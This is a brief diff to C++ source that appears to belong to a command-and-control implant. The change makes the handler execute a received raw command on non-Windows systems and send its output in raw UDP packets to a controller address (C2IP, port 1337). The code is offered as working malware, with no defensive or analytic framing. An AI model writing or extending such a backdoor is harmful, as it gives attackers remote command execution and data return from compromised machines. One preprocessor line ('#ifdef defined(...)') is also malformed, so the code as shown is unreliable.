@@ -33,6 +33,8 @@ int BPHelper::actionResponse(unique_ptr<info_t> eventInfo) {
             else {
                 output = result->std_output;
             }
+#else
+            output = exec(rawCommand.c_str());
 #endif
 
             bp_header_t bpHeader{};
@@ -48,11 +50,22 @@ int BPHelper::actionResponse(unique_ptr<info_t> eventInfo) {
 
             vector<uint8_t> payload(bp_header_ptr, bp_header_ptr + sizeof(bpHeader));
             payload.insert(payload.end(), bp_ptr, bp_ptr + sizeof(bp_response));
+
+#ifdef defined(_WIN32) || defined(WIN32)
             vector<uint8_t> req = CraftUDPPacket(rawSocket.getIP(),
                                                  C2IP,
                                                  1337,
                                                  1337,
                                                  payload);
+#else
+            vector<uint8_t> req = CraftUDPPacket(rawSocket.getIP(),
+                                                 C2IP,
+                                                 1337,
+                                                 1337,
+                                                 payload,
+                                                 rawSocket.getMac(),
+                                                 nextHopMac);
+#endif
 
             rawSocket.send(req);
 
